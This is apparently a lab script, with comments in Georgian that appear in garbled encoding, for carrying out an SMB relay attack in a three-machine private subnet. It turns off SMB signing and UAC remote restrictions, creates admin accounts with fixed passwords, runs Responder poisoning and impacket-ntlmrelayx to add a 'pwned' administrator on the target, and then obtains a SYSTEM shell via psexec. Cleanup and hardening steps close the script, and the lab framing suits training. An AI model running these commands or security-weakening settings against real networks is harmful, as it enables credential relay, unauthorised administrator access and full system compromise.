# ===============================================
# SMB Relay рЃерЃћрЃбрЃћрЃЋрЃўрЃА рЃџрЃљрЃЉрЃЮрЃарЃљрЃбрЃЮрЃарЃўрЃљ - рЃЊрЃћрЃбрЃљрЃџрЃБрЃарЃў рЃњрЃќрЃљрЃЏрЃЎрЃЋрЃџрЃћрЃЋрЃў
# ===============================================
# рЃЦрЃАрЃћрЃџрЃўрЃА рЃбрЃЮрЃърЃЮрЃџрЃЮрЃњрЃўрЃљ:
# Kali (Attacker)     РђЊ 192.168.56.10  (eth0)
# Win10 (Victim)      РђЊ 192.168.56.20
# Win2019 (Target)    РђЊ 192.168.56.30
# 
# рЃЏрЃўрЃќрЃљрЃюрЃў: LLMNR/NBT-NS Poisoning Рєњ NTLM Relay Рєњ Target-рЃќрЃћ рЃљрЃЊрЃЏрЃўрЃюрЃў рЃерЃћрЃЦрЃЏрЃюрЃљ
# ===============================================

# ===============================================
# р▓юр▓љр▓Љр▓ўр▓»р▓ў 1: TARGET MACHINE (Win2019 - 192.168.56.30)
# ===============================================
echo "=== TARGET MACHINE (Win2019 - 192.168.56.30) ==="
echo "рЃњрЃљрЃ«рЃАрЃћрЃюрЃў PowerShell рЃарЃЮрЃњрЃЮрЃарЃф Administrator рЃЊрЃљ рЃњрЃљрЃБрЃерЃЋрЃў:"

# Target рЃЏрЃљрЃюрЃЦрЃљрЃюрЃљрЃќрЃћ рЃњрЃљрЃАрЃљрЃерЃЋрЃћрЃЉрЃў рЃЉрЃарЃФрЃљрЃюрЃћрЃЉрЃћрЃЉрЃў:
net user labadmin "Passw0rd!23" /add
net localgroup Administrators labadmin /add

# UAC Remote Restrictions-рЃўрЃА рЃњрЃљрЃЏрЃЮрЃарЃЌрЃЋрЃљ
New-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name LocalAccountTokenFilterPolicy -Value 1 -PropertyType DWord -Force

# SMB Server Signing рЃњрЃљрЃЏрЃЮрЃарЃЌрЃЋрЃљ
Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters' -Name RequireSecuritySignature -Type DWord -Value 0

# SMB Client Signing рЃњрЃљрЃЏрЃЮрЃарЃЌрЃЋрЃљ
Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters' -Name RequireSecuritySignature -Type DWord -Value 0

# File and Printer Sharing рЃцрЃљрЃўрЃарЃЋрЃЮрЃџ рЃгрЃћрЃАрЃћрЃЉрЃўрЃА рЃЕрЃљрЃарЃЌрЃЋрЃљ
Set-NetFirewallRule -DisplayGroup "File and Printer Sharing" -Enabled True

# Network Discovery рЃЕрЃљрЃарЃЌрЃЋрЃљ
netsh advfirewall firewall set rule group="Network Discovery" new enable=Yes

# рЃЦрЃАрЃћрЃџрЃўрЃА рЃърЃарЃЮрЃцрЃўрЃџрЃў Private-рЃќрЃћ рЃЊрЃљрЃДрЃћрЃюрЃћрЃЉрЃљ
Set-NetConnectionProfile -NetworkCategory Private

echo "Target рЃЎрЃЮрЃюрЃцрЃўрЃњрЃБрЃарЃљрЃфрЃўрЃљ рЃЊрЃљрЃАрЃарЃБрЃџрЃЊрЃљ. рЃарЃћрЃАрЃбрЃљрЃарЃбрЃў рЃњрЃљрЃБрЃЎрЃћрЃЌрЃћ:"
shutdown /r /t 60
echo "(60 рЃгрЃљрЃЏрЃерЃў рЃњрЃљрЃЊрЃљрЃўрЃарЃЌрЃЋрЃћрЃЉрЃљ)"

# ===============================================
# р▓юр▓љр▓Љр▓ўр▓»р▓ў 2: VICTIM MACHINE (Win10 - 192.168.56.20)
# ===============================================
echo ""
echo "=== VICTIM MACHINE (Win10 - 192.168.56.20) ==="
echo "рЃњрЃљрЃ«рЃАрЃћрЃюрЃў PowerShell рЃарЃЮрЃњрЃЮрЃарЃф Administrator рЃЊрЃљ рЃњрЃљрЃБрЃерЃЋрЃў:"

# Victim рЃЏрЃљрЃюрЃЦрЃљрЃюрЃљрЃќрЃћ рЃњрЃљрЃАрЃљрЃерЃЋрЃћрЃЉрЃў рЃЉрЃарЃФрЃљрЃюрЃћрЃЉрЃћрЃЉрЃў:
net user labadmin "Passw0rd!23" /add
net localgroup Administrators labadmin /add

# UAC Remote Restrictions-рЃўрЃА рЃњрЃљрЃЏрЃЮрЃарЃЌрЃЋрЃљ
New-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name LocalAccountTokenFilterPolicy -Value 1 -PropertyType DWord -Force

# SMB Client Signing рЃњрЃљрЃЏрЃЮрЃарЃЌрЃЋрЃљ
Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters' -Name RequireSecuritySignature -Type DWord -Value 0

# File and Printer Sharing рЃцрЃљрЃўрЃарЃЋрЃЮрЃџ рЃгрЃћрЃАрЃћрЃЉрЃўрЃА рЃЕрЃљрЃарЃЌрЃЋрЃљ
Set-NetFirewallRule -DisplayGroup "File and Printer Sharing" -Enabled True

# Network Discovery рЃЕрЃљрЃарЃЌрЃЋрЃљ
netsh advfirewall firewall set rule group="Network Discovery" new enable=Yes

# рЃЦрЃАрЃћрЃџрЃўрЃА рЃърЃарЃЮрЃцрЃўрЃџрЃў Private-рЃќрЃћ рЃЊрЃљрЃДрЃћрЃюрЃћрЃЉрЃљ
Set-NetConnectionProfile -NetworkCategory Private

echo "Victim рЃЎрЃЮрЃюрЃцрЃўрЃњрЃБрЃарЃљрЃфрЃўрЃљ рЃЊрЃљрЃАрЃарЃБрЃџрЃЊрЃљ. рЃарЃћрЃАрЃбрЃљрЃарЃбрЃў рЃњрЃљрЃБрЃЎрЃћрЃЌрЃћ:"
shutdown /r /t 60

# ===============================================
# р▓юр▓љр▓Љр▓ўр▓»р▓ў 3: KALI MACHINE (192.168.56.10) - рЃЏрЃЮрЃЏрЃќрЃљрЃЊрЃћрЃЉрЃљ
# ===============================================
echo ""
echo "=== KALI MACHINE (192.168.56.10) - рЃЏрЃЮрЃЏрЃќрЃљрЃЊрЃћрЃЉрЃљ ==="
echo "Kali-рЃерЃў terminal рЃњрЃљрЃ«рЃАрЃћрЃюрЃў рЃЊрЃљ рЃњрЃљрЃБрЃерЃЋрЃў:"

# Kali-рЃќрЃћ рЃњрЃљрЃАрЃљрЃерЃЋрЃћрЃЉрЃў рЃЉрЃарЃФрЃљрЃюрЃћрЃЉрЃћрЃЉрЃў:
sudo apt update
sudo apt install -y responder crackmapexec impacket-scripts

# Responder рЃЎрЃЮрЃюрЃцрЃўрЃњрЃБрЃарЃљрЃфрЃўрЃўрЃА backup
sudo cp /etc/responder/Responder.conf /etc/responder/Responder.conf.backup

# SMB рЃЊрЃљ HTTP-рЃўрЃА рЃњрЃљрЃЏрЃЮрЃарЃЌрЃЋрЃљ Responder-рЃерЃў (рЃарЃљрЃЌрЃљ ntlmrelayx-рЃЏрЃљ рЃЏрЃўрЃўрЃдрЃЮрЃА рЃбрЃарЃљрЃцрЃўрЃЎрЃў)
sudo sed -i 's/^SMB = .*/SMB = Off/' /etc/responder/Responder.conf
sudo sed -i 's/^HTTP = .*/HTTP = Off/' /etc/responder/Responder.conf

# рЃЎрЃЮрЃюрЃцрЃўрЃњрЃБрЃарЃљрЃфрЃўрЃўрЃА рЃерЃћрЃЏрЃЮрЃгрЃЏрЃћрЃЉрЃљ
echo "рЃерЃћрЃљрЃЏрЃЮрЃгрЃЏрЃћ Responder рЃЎрЃЮрЃюрЃцрЃўрЃњрЃБрЃарЃљрЃфрЃўрЃљ:"
grep -E "^(SMB|HTTP) =" /etc/responder/Responder.conf
echo "рЃБрЃюрЃЊрЃљ рЃћрЃгрЃћрЃарЃЮрЃА: SMB = Off рЃЊрЃљ HTTP = Off"

# Target-рЃћрЃЉрЃўрЃА рЃцрЃљрЃўрЃџрЃўрЃА рЃерЃћрЃЦрЃЏрЃюрЃљ
echo "192.168.56.30" > targets.txt
echo "targets.txt рЃцрЃљрЃўрЃџрЃў рЃерЃћрЃўрЃЦрЃЏрЃюрЃљ"

# ===============================================
# р▓юр▓љр▓Љр▓ўр▓»р▓ў 4: KALI MACHINE - рЃерЃћрЃбрЃћрЃЋрЃўрЃА рЃЊрЃљрЃгрЃДрЃћрЃЉрЃљ
# ===============================================
echo ""
echo "=== KALI MACHINE - рЃерЃћрЃбрЃћрЃЋрЃўрЃА рЃЊрЃљрЃгрЃДрЃћрЃЉрЃљ ==="
echo ""
echo "­Ъћ╣ TERMINAL 1 (Kali-рЃерЃў): Responder рЃњрЃљрЃерЃЋрЃћрЃЉрЃљ"
echo "sudo responder -I eth0 -wrf"
echo "  (рЃЌрЃБ рЃерЃћрЃюрЃў рЃўрЃюрЃбрЃћрЃарЃцрЃћрЃўрЃАрЃў рЃАрЃ«рЃЋрЃљ рЃАрЃљрЃ«рЃћрЃџрЃўрЃАрЃљрЃљ, eth0-рЃўрЃА рЃЏрЃљрЃњрЃўрЃЋрЃарЃљрЃЊ рЃўрЃА рЃЊрЃљрЃгрЃћрЃарЃћ)"
echo "  рЃерЃћрЃљрЃЏрЃЮрЃгрЃЏрЃћ: ip -br a"
echo ""

echo "­Ъћ╣ TERMINAL 2 (Kali-рЃерЃў): ntlmrelayx рЃњрЃљрЃерЃЋрЃћрЃЉрЃљ"
echo "impacket-ntlmrelayx -tf targets.txt -smb2support -c 'net user pwned \"Password123!\" /add && net localgroup administrators pwned /add'"
echo ""

echo "рЃЮрЃарЃўрЃЋрЃћ рЃЉрЃарЃФрЃљрЃюрЃћрЃЉрЃљ рЃърЃљрЃарЃљрЃџрЃћрЃџрЃБрЃарЃљрЃЊ рЃБрЃюрЃЊрЃљ рЃЏрЃБрЃерЃљрЃЮрЃЉрЃЊрЃћрЃА!"

# ===============================================
# р▓юр▓љр▓Љр▓ўр▓»р▓ў 5: VICTIM MACHINE - рЃерЃћрЃбрЃћрЃЋрЃўрЃА рЃбрЃарЃўрЃњрЃћрЃарЃў
# ===============================================
echo ""
echo "=== VICTIM MACHINE (Win10) - рЃерЃћрЃбрЃћрЃЋрЃўрЃА рЃбрЃарЃўрЃњрЃћрЃарЃў ==="
echo "рЃарЃЮрЃЊрЃћрЃАрЃљрЃф Kali-рЃќрЃћ рЃЮрЃарЃўрЃЋрЃћ tool рЃЏрЃБрЃерЃљрЃЮрЃЉрЃА, Victim-рЃќрЃћ рЃњрЃљрЃБрЃерЃЋрЃў:"
echo ""
echo "­Ъћ╣ рЃЏрЃћрЃЌрЃЮрЃЊрЃў 1 - File Explorer:"
echo "File Explorer рЃњрЃљрЃ«рЃАрЃћрЃюрЃў Рєњ Address Bar-рЃерЃў рЃљрЃЎрЃарЃўрЃцрЃћ:"
echo "\\\\nonexistent-server"
echo ""
echo "­Ъћ╣ рЃЏрЃћрЃЌрЃЮрЃЊрЃў 2 - CMD:"
echo "cmd рЃњрЃљрЃ«рЃАрЃћрЃюрЃў рЃЊрЃљ рЃљрЃЎрЃарЃўрЃцрЃћ:"
echo "dir \\\\fake-server\\share"
echo ""
echo "­Ъћ╣ рЃЏрЃћрЃЌрЃЮрЃЊрЃў 3 - PowerShell:"
echo "Test-NetConnection fake-server"
echo ""
echo "­Ъћ╣ рЃЏрЃћрЃЌрЃЮрЃЊрЃў 4 - Net Use:"
echo "net use * \\\\nonexistent\\share"

# ===============================================
# р▓юр▓љр▓Љр▓ўр▓»р▓ў 6: KALI MACHINE - рЃгрЃљрЃарЃЏрЃљрЃбрЃћрЃЉрЃўрЃА рЃерЃћрЃЏрЃЮрЃгрЃЏрЃћрЃЉрЃљ
# ===============================================
echo ""
echo "=== KALI MACHINE - рЃгрЃљрЃарЃЏрЃљрЃбрЃћрЃЉрЃўрЃА рЃерЃћрЃЏрЃЮрЃгрЃЏрЃћрЃЉрЃљ ==="
echo ""
echo "рЃарЃЮрЃЊрЃћрЃАрЃљрЃф ntlmrelayx-рЃерЃў рЃЊрЃљрЃўрЃюрЃљрЃ«рЃљрЃЋ: '[*] SMBD-Thread-X: Authenticating... SUCCESS!'"
echo "рЃЏрЃљрЃерЃўрЃю рЃерЃћрЃљрЃЏрЃЮрЃгрЃЏрЃћ:"
echo ""
echo "­Ъћ╣ рЃљрЃ«рЃљрЃџрЃў рЃљрЃЊрЃЏрЃўрЃюрЃўрЃА рЃерЃћрЃЏрЃЮрЃгрЃЏрЃћрЃЉрЃљ:"
echo "crackmapexec smb 192.168.56.30 -u pwned -p 'Password123!' --local-auth"
echo ""
echo "рЃЌрЃБ рЃЊрЃљрЃўрЃюрЃљрЃ«рЃљрЃЋ 'Pwn3d!' - рЃгрЃљрЃарЃЏрЃљрЃбрЃћрЃЉрЃБрЃџрЃўрЃљ!"
echo ""
echo "­Ъћ╣ SYSTEM Shell-рЃўрЃА рЃЏрЃўрЃдрЃћрЃЉрЃљ:"
echo "impacket-psexec pwned:'Password123!'@192.168.56.30"

# ===============================================
# р▓юр▓љр▓Љр▓ўр▓»р▓ў 7: TROUBLESHOOTING
# ===============================================
echo ""
echo "=== TROUBLESHOOTING ==="
echo ""
echo "­Ъћ╣ KALI-рЃќрЃћ рЃњрЃљрЃЊрЃљрЃљрЃЏрЃЮрЃгрЃЏрЃћ:"
echo "# рЃЦрЃАрЃћрЃџрЃўрЃА рЃўрЃюрЃбрЃћрЃарЃцрЃћрЃўрЃАрЃў"
echo "ip -br a"
echo "ip route"
echo ""
echo "# Responder рЃЎрЃЮрЃюрЃцрЃўрЃњрЃБрЃарЃљрЃфрЃўрЃљ"
echo "grep -E '^(SMB|HTTP) =' /etc/responder/Responder.conf"
echo ""
echo "# Ping Target"
echo "ping -c 3 192.168.56.30"
echo ""

echo "­Ъћ╣ TARGET (Win2019) рЃЏрЃљрЃюрЃЦрЃљрЃюрЃљрЃќрЃћ PowerShell-рЃўрЃЌ рЃерЃћрЃљрЃЏрЃЮрЃгрЃЏрЃћ:"
echo "# SMB рЃЎрЃЮрЃюрЃцрЃўрЃњрЃБрЃарЃљрЃфрЃўрЃљ"
echo "Get-SmbServerConfiguration | select RequireSecuritySignature"
echo "Get-SmbClientConfiguration | select RequireSecuritySignature"
echo "# рЃЮрЃарЃўрЃЋрЃћ False рЃБрЃюрЃЊрЃљ рЃўрЃДрЃЮрЃА"
echo ""
echo "# рЃЦрЃАрЃћрЃџрЃўрЃА рЃърЃарЃЮрЃцрЃўрЃџрЃў"
echo "Get-NetConnectionProfile"
echo "# NetworkCategory: Private рЃБрЃюрЃЊрЃљ рЃўрЃДрЃЮрЃА"
echo ""
echo "# рЃцрЃљрЃўрЃарЃЋрЃЮрЃџрЃў"
echo "Get-NetFirewallRule -DisplayGroup 'File and Printer Sharing' | select DisplayName, Enabled"
echo ""

echo "­Ъћ╣ VICTIM (Win10) рЃЏрЃљрЃюрЃЦрЃљрЃюрЃљрЃќрЃћ PowerShell-рЃўрЃЌ рЃерЃћрЃљрЃЏрЃЮрЃгрЃЏрЃћ:"
echo "# SMB рЃЎрЃџрЃўрЃћрЃюрЃбрЃў"
echo "Get-SmbClientConfiguration | select RequireSecuritySignature"
echo "# False рЃБрЃюрЃЊрЃљ рЃўрЃДрЃЮрЃА"
echo ""
echo "# рЃЦрЃАрЃћрЃџрЃўрЃА рЃърЃарЃЮрЃцрЃўрЃџрЃў"
echo "Get-NetConnectionProfile"
echo ""

echo "­Ъћ╣ рЃДрЃЋрЃћрЃџрЃљ рЃЏрЃљрЃюрЃЦрЃљрЃюрЃљрЃќрЃћ ping рЃњрЃљрЃЊрЃљрЃљрЃЏрЃЮрЃгрЃЏрЃћ:"
echo "ping 192.168.56.10  # Kali"
echo "ping 192.168.56.20  # Victim"
echo "ping 192.168.56.30  # Target"

# ===============================================
# р▓юр▓љр▓Љр▓ўр▓»р▓ў 8: CLEANUP
# ===============================================
echo ""
echo "=== CLEANUP ==="
echo ""
echo "­Ъћ╣ TARGET (Win2019) рЃЏрЃљрЃюрЃЦрЃљрЃюрЃљрЃќрЃћ:"
echo "net user pwned /del"
echo "net user labadmin /del"
echo ""
echo "­Ъћ╣ VICTIM (Win10) рЃЏрЃљрЃюрЃЦрЃљрЃюрЃљрЃќрЃћ:"
echo "net user labadmin /del"
echo ""
echo "­Ъћ╣ KALI рЃЏрЃљрЃюрЃЦрЃљрЃюрЃљрЃќрЃћ:"
echo "sudo cp /etc/responder/Responder.conf.backup /etc/responder/Responder.conf"
echo "rm targets.txt"

# ===============================================
# рЃБрЃАрЃљрЃцрЃарЃЌрЃ«рЃЮрЃћрЃЉрЃўрЃА рЃарЃћрЃЎрЃЮрЃЏрЃћрЃюрЃЊрЃљрЃфрЃўрЃћрЃЉрЃў
# ===============================================
echo ""
echo "=== рЃБрЃАрЃљрЃцрЃарЃЌрЃ«рЃЮрЃћрЃЉрЃўрЃА рЃарЃћрЃЎрЃЮрЃЏрЃћрЃюрЃЊрЃљрЃфрЃўрЃћрЃЉрЃў ==="
echo ""
echo "­Ъћњ SMB Signing рЃЕрЃљрЃарЃЌрЃЋрЃљ:"
echo "Set-SmbServerConfiguration -RequireSecuritySignature \$true -Force"
echo "Set-SmbClientConfiguration -RequireSecuritySignature \$true -Force"
echo ""
echo "­Ъћњ LLMNR/NBT-NS рЃњрЃљрЃЏрЃЮрЃарЃЌрЃЋрЃљ Group Policy-рЃўрЃЌ:"
echo "Computer Configuration Рєњ Administrative Templates Рєњ Network Рєњ DNS Client"
echo "Рєњ 'Turn off multicast name resolution' = Enabled"
echo ""
echo "­Ъћњ WPAD рЃњрЃљрЃЏрЃЮрЃарЃЌрЃЋрЃљ Registry-рЃўрЃЌ:"
echo "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Wpad"
echo "Рєњ WpadOverride = 1"
